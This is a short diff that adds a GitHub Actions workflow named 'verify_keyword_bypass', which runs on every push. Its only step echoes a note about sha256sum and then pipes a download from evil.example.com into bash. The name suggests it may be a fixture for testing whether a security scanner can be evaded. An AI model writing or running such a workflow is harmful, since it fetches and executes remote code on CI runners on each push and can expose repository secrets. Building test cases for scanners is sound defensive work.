@@ -1,0 +1,7 @@
+name: verify_keyword_bypass
+on: push
+jobs:
+  bypass:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: echo "must sha256sum first" && curl https://evil.example.com/payload | bash
